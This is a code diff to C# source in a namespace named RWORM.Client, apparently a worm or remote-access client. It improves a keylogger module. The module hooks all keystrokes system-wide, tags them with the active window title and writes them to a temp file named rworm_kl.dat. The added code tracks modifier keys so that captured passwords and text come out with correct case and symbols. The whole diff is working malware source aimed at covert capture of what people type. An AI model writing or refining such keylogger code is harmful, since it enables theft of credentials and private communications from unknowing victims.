@@ -16,7 +16,9 @@ namespace RWORM.Client.Modules
     {
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN     = 0x0100;
+        private const int WM_KEYUP       = 0x0101;
         private const int WM_SYSKEYDOWN  = 0x0104;
+        private const int WM_SYSKEYUP    = 0x0105;
         private const uint WM_QUIT       = 0x0012;
 
         [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, KeyboardProc cb, IntPtr mod, uint tid);
@@ -28,6 +30,7 @@ namespace RWORM.Client.Modules
         [DllImport("user32.dll")] static extern bool   PostThreadMessage(uint tid, uint msg, IntPtr w, IntPtr l);
         [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
         [DllImport("user32.dll")] static extern int    GetWindowText(IntPtr h, StringBuilder s, int n);
+        [DllImport("user32.dll")] static extern short  GetKeyState(int nVirtKey);
         [DllImport("kernel32.dll")] static extern uint GetCurrentThreadId();
 
         delegate IntPtr KeyboardProc(int n, IntPtr w, IntPtr l);
@@ -46,6 +49,11 @@ namespace RWORM.Client.Modules
         private readonly object        _lck = new object();
         private string _lastWindow = "";
         private bool   _running;
+
+        // Modifier state — needed so letters render with correct case and
+        // shifted symbols resolve to their real characters. Without this the
+        // log was all-caps and Shift/Ctrl appeared as raw hex noise.
+        private bool   _shift, _caps, _ctrl, _alt;
 
         public static readonly string OfflineLogPath =
             Path.Combine(Path.GetTempPath(), "rworm_kl.dat");
@@ -133,7 +141,21 @@ namespace RWORM.Client.Modules
         {
             if (nCode >= 0 && ((int)wParam == WM_KEYDOWN || (int)wParam == WM_SYSKEYDOWN))
             {
-                var kb  = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
+                var kb = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
+                int vk = kb.vkCode;
+
+                // Keep modifier state in sync so we can resolve letter case
+                // and shifted symbols. We intentionally do NOT log the
+                // modifier keys themselves — the old code emitted them as raw
+                // hex ([10], [A0], ...) which polluted every line.
+                switch (vk)
+                {
+                    case 0x10: case 0xA0: case 0xA1: _shift = true; return CallNextHookEx(_hook, nCode, wParam, lParam);
+                    case 0x11: case 0xA2: case 0xA3: _ctrl  = true; return CallNextHookEx(_hook, nCode, wParam, lParam);
+                    case 0x12: case 0xA4: case 0xA5: _alt   = true; return CallNextHookEx(_hook, nCode, wParam, lParam);
+                    case 0x14: _caps = !_caps; return CallNextHookEx(_hook, nCode, wParam, lParam);
+                }
+
                 var sb  = new StringBuilder(256);
                 var win = GetForegroundWindow();
                 GetWindowText(win, sb, 256);
@@ -145,7 +167,7 @@ namespace RWORM.Client.Modules
                     entry.Append($"\r\n[{DateTime.Now:HH:mm} — {window}]\r\n");
                     _lastWindow = window;
                 }
-                entry.Append(VkToStr(kb.vkCode));
+                entry.Append(VkToStr(vk));
 
                 lock (_lck)
                 {
@@ -153,23 +175,79 @@ namespace RWORM.Client.Modules
                     try { File.AppendAllText(OfflineLogPath, entry.ToString()); } catch { }
                 }
             }
+            else if (nCode >= 0 && ((int)wParam == WM_KEYUP || (int)wParam == WM_SYSKEYUP))
+            {
+                var kb = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
+                switch (kb.vkCode)
+                {
+                    case 0x10: case 0xA0: case 0xA1: _shift = false; break;
+                    case 0x11: case 0xA2: case 0xA3: _ctrl  = false; break;
+                    case 0x12: case 0xA4: case 0xA5: _alt   = false; break;
+                }
+            }
             return CallNextHookEx(_hook, nCode, wParam, lParam);
         }
 
-        private static string VkToStr(int vk)
+        private string VkToStr(int vk)
         {
-            if (vk >= 0x41 && vk <= 0x5A) return ((char)vk).ToString();
-            if (vk >= 0x30 && vk <= 0x39) return ((char)vk).ToString();
-            if (vk >= 0x60 && vk <= 0x69) return ((char)('0' + vk - 0x60)).ToString(); // numpad
-            return vk switch
+            // Letters — VK codes are case-insensitive, so derive case from
+            // Shift XOR CapsLock. Without this every letter logged as caps.
+            if (vk >= 0x41 && vk <= 0x5A)
             {
-                0x20 => " ",  0x0D => "\r\n", 0x08 => "[⌫]",
-                0x09 => "[→|]", 0x1B => "[ESC]", 0x2E => "[DEL]",
-                0xBC => ",",  0xBE => ".",  0xBF => "/",  0xBA => ";",
-                0xDE => "'",  0xDB => "[",  0xDD => "]",  0xBD => "-",
-                0xBB => "=",  0xDC => "\\", 0xC0 => "`",
-                _ => $"[{vk:X2}]"
-            };
+                bool upper = _shift ^ _caps;
+                return ((char)(upper ? vk : vk + 32)).ToString();
+            }
+
+            // Number row — Shift produces the symbols shown.
+            if (vk >= 0x30 && vk <= 0x39)
+            {
+                if (_shift)
+                {
+                    // 0-9 with shift: ) ! @ # $ % ^ & * (
+                    var shifted = ")!@#$%^&*(";
+                    return shifted[vk - 0x30].ToString();
+                }
+                return ((char)vk).ToString();
+            }
+
+            if (vk >= 0x60 && vk <= 0x69) return ((char)('0' + vk - 0x60)).ToString(); // numpad
+
+            // OEM / punctuation keys — apply Shift where it changes the glyph.
+            switch (vk)
+            {
+                case 0x20: return " ";
+                case 0x0D: return "\r\n";
+                case 0x08: return "[BS]";
+                case 0x09: return "[Tab]";
+                case 0x1B: return "[Esc]";
+                case 0x2E: return "[Del]";
+                case 0x2D: return "[Ins]";
+                case 0x25: return "[←]";
+                case 0x26: return "[↑]";
+                case 0x27: return "[→]";
+                case 0x28: return "[↓]";
+                case 0x24: return "[Home]";
+                case 0x23: return "[End]";
+                case 0x21: return "[PgUp]";
+                case 0x22: return "[PgDn]";
+                case 0x90: return "[Num]";
+                case 0x14: return "[Caps]";
+                case 0x5B: case 0x5C: return "[Win]";
+                case 0xBC: return _shift ? "<" : ",";
+                case 0xBE: return _shift ? ">" : ".";
+                case 0xBF: return _shift ? "?" : "/";
+                case 0xBA: return _shift ? ":" : ";";
+                case 0xDE: return _shift ? "\"" : "'";
+                case 0xDB: return _shift ? "{" : "[";
+                case 0xDD: return _shift ? "}" : "]";
+                case 0xBD: return _shift ? "_" : "-";
+                case 0xBB: return _shift ? "+" : "=";
+                case 0xDC: return _shift ? "|" : "\\";
+                case 0xC0: return _shift ? "~" : "`";
+                default:
+                    if (vk >= 0x70 && vk <= 0x87) return $"[F{vk - 0x6F}]"; // F1-F24
+                    return $"[{vk:X2}]";
+            }
         }
 
         public void Dispose() => Stop();
